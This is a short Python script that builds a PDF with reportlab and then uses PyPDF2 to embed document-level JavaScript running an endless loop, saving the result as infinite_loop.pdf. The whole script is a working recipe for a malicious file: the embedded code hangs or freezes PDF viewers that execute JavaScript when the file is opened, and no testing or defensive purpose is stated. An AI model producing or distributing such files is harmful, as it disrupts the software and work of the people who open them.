from reportlab.pdfgen import canvas
from PyPDF2 import PdfReader, PdfWriter

def create_pdf(path):
    c = canvas.Canvas(path)
    c.drawString(100, 750, "This PDF contains JavaScript that runs an infinite loop.")
    c.showPage()
    c.save()

def add_infinite_loop_js(input_pdf, output_pdf):
    reader = PdfReader(input_pdf)
    writer = PdfWriter()

    for page_num in range(len(reader.pages)):
        page = reader.pages[page_num]
        writer.add_page(page)

    # JavaScript for an infinite loop
    js = """
    var infiniteLoop = function() {
        while (true) {}
    }
    infiniteLoop();
    """
    writer.add_js(js)

    with open(output_pdf, "wb") as out_file:
        writer.write(out_file)

# Create the initial PDF
create_pdf("example.pdf")

# Add JavaScript with an infinite loop to the PDF
add_infinite_loop_js("example.pdf", "infinite_loop.pdf")